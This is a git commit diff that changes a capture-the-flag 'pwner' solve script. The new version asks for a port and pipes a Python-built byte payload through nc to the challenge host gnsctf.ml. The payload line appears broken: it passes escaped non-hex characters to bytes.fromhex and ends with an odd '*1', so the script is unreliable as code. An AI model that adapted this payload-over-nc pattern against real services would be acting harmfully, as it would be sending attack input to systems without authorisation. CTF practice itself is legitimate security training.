928a690215e9e0831f2bc17b6b20af203a4d0d1f
Jack Meng <jackmeng0814@gmail.com>
2021-10-27 13:37:46 -0400

    Update solve_pwner.sh

--- self_test/pwner/solve_pwner.sh
+++ self_test/pwner/solve_pwner.sh
@@ -2,6 +2,8 @@
 
 echo -e "\e[31mRunning Script... \e[0m" ; echo ;
 
-python -c 'print(bytes.fromhex("\x45\x49\x04\x84\x05\x84\x23\x02\x99\x32").decode("latin-1"))*1'
+echo "Enter Port" ; read portNum ;
+
+(python -c 'print(bytes.fromhex("\x45\x49\x04\x84\x05\x84\x23\x02\x99\x32").decode("latin-1"))*1') | nc gnsctf.ml $portNum
 
 echo -e "End Script" ; echo ; exit
